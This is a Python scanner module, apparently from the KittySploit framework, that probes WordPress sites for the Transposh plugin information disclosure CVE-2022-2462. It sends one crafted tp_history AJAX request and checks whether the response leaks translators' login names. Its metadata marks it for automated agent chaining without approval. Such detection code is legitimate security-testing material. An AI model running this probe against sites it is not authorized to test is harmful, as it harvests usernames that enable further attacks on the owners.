#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Transposh plugin through is susceptible to information disclosure via the AJAX action tp_history, wh."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Transposh <=1.0.8.1 - Information Disclosure Detection',
        'description': "WordPress Transposh plugin through is susceptible to information disclosure via the AJAX action tp_history, which is intended to return data about who has translated a text given by the token parameter. However, the plugin also returns the user's login name as part of the user_login attribute. If an anonymous user submits the translation, the user's IP address is returned. An attacker can leak the WordPress username of translators and potentially execute other unauthorized operations.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'disclosure', 'wp-plugin', 'packetstorm', 'transposh', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/167878/wptransposh1081-disclose.txt',
            'https://github.com/oferwald/transposh',
            'https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/',
            'https://www.wordfence.com/vulnerability-advisories/#CVE-2022-2462',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2462',
        ],
        'cve': 'CVE-2022-2462',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=tp_history&token=&lang=en')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('translated', 'translated_by', 'timestamp', 'source', 'user_login',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='medium',
                reason='WordPress Transposh <=1.0.8.1 - Information Disclosure detected',
                path=path,
            )
            return True
        return False

